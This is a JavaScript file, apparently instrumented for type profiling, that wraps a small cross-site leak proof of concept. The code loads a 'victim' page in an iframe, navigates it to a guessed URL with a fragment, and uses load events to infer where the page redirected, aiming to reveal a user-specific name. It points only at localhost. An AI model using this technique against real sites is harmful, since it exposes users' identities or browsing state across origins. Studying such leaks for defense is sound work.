var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}




try { if (Inst1 <= 1000 && typeof (guessURL) != "undefined") {_RecordType("<33,41,5>",(guessURL)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (victimURL) != "undefined") {_RecordType("<43,52,5>",(victimURL)); Inst2++; } } catch(e) {}
		const tryToGuessURL = (guessURL, victimURL) => {



try { if (Inst4 <= 1000 && typeof (document.createElement) != "undefined") {_RecordType("<82,104,9>",(document.createElement)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (document) != "undefined") {_RecordType("<82,90,9>",(document)); Inst5++; } } catch(e) {}
			let iframe = document.createElement("iframe");
try { if (Inst3 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<73,79,9>",(iframe)); Inst3++; } } catch(e) {}

try { if (Inst8 <= 1000 && typeof (victimURL) != "undefined") {_RecordType("<135,144,11>",(victimURL)); Inst8++; } } catch(e) {}
			iframe.src = victimURL;
try { if (Inst6 <= 1000 && typeof (iframe.src) != "undefined") {_RecordType("<122,132,11>",(iframe.src)); Inst6++; } } catch(e) {}try { if (Inst7 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<122,128,11>",(iframe)); Inst7++; } } catch(e) {}

			let didItLoad = false;
try { if (Inst9 <= 1000 && typeof (didItLoad) != "undefined") {_RecordType("<156,165,13>",(didItLoad)); Inst9++; } } catch(e) {}



			iframe.onload = () => {



				iframe.onload = () => {

					didItLoad = true;
try { if (Inst14 <= 1000 && typeof (didItLoad) != "undefined") {_RecordType("<252,261,23>",(didItLoad)); Inst14++; } } catch(e) {}

try { if (Inst15 <= 1000 && typeof (alert) != "undefined") {_RecordType("<278,283,25>",(alert)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (guessURL) != "undefined") {_RecordType("<319,327,25>",(guessURL)); Inst16++; } } catch(e) {}
					alert(`The iframe wasn't redirected to ${guessURL}`);

				}
try { if (Inst12 <= 1000 && typeof (iframe.onload) != "undefined") {_RecordType("<220,233,21>",(iframe.onload)); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<220,226,21>",(iframe)); Inst13++; } } catch(e) {}



try { if (Inst20 <= 1000 && typeof (guessURL) != "undefined") {_RecordType("<387,395,31>",(guessURL)); Inst20++; } } catch(e) {}
				iframe.contentWindow.location = `${guessURL}#1337`;
try { if (Inst17 <= 1000 && typeof (iframe.contentWindow.location) != "undefined") {_RecordType("<352,381,31>",(iframe.contentWindow.location)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (iframe.contentWindow) != "undefined") {_RecordType("<352,372,31>",(iframe.contentWindow)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<352,358,31>",(iframe)); Inst19++; } } catch(e) {}



try { if (Inst21 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<415,425,35>",(setTimeout)); Inst21++; } } catch(e) {}
				setTimeout(()=> {

try { if (Inst22 <= 1000 && typeof (didItLoad) != "undefined") {_RecordType("<446,455,37>",(didItLoad)); Inst22++; } } catch(e) {}
					if (!didItLoad)

try { if (Inst23 <= 1000 && typeof (alert) != "undefined") {_RecordType("<466,471,39>",(alert)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (guessURL) != "undefined") {_RecordType("<504,512,39>",(guessURL)); Inst24++; } } catch(e) {}
						alert(`The iframe was redirected to ${guessURL}`);

				}, 3000);

			}
try { if (Inst10 <= 1000 && typeof (iframe.onload) != "undefined") {_RecordType("<185,198,17>",(iframe.onload)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<185,191,17>",(iframe)); Inst11++; } } catch(e) {}



try { if (Inst25 <= 1000 && typeof (document.body.appendChild) != "undefined") {_RecordType("<552,577,47>",(document.body.appendChild)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (document.body) != "undefined") {_RecordType("<552,565,47>",(document.body)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (document) != "undefined") {_RecordType("<552,560,47>",(document)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<578,584,47>",(iframe)); Inst28++; } } catch(e) {}
			document.body.appendChild(iframe);



		}
try { if (Inst0 <= 1000 && typeof (tryToGuessURL) != "undefined") {_RecordType("<16,29,5>",(tryToGuessURL)); Inst0++; } } catch(e) {}



		onload = () => {

			// This tries to guess that the "/me.php" endpoint redirects the user to "/invalidName.php"

try { if (Inst30 <= 1000 && typeof (tryToGuessURL) != "undefined") {_RecordType("<728,741,59>",(tryToGuessURL)); Inst30++; } } catch(e) {}
			tryToGuessURL("http://localhost/invalidName.php", "http://localhost/me.php");

			// This tries to guess that the "/me.php" endpoint redirects the user to "/victimName.php"

try { if (Inst31 <= 1000 && typeof (tryToGuessURL) != "undefined") {_RecordType("<909,922,63>",(tryToGuessURL)); Inst31++; } } catch(e) {}
			tryToGuessURL("http://localhost/victimName.php", "http://localhost/me.php");

		}
try { if (Inst29 <= 1000 && typeof (onload) != "undefined") {_RecordType("<607,613,55>",(onload)); Inst29++; } } catch(e) {}



	
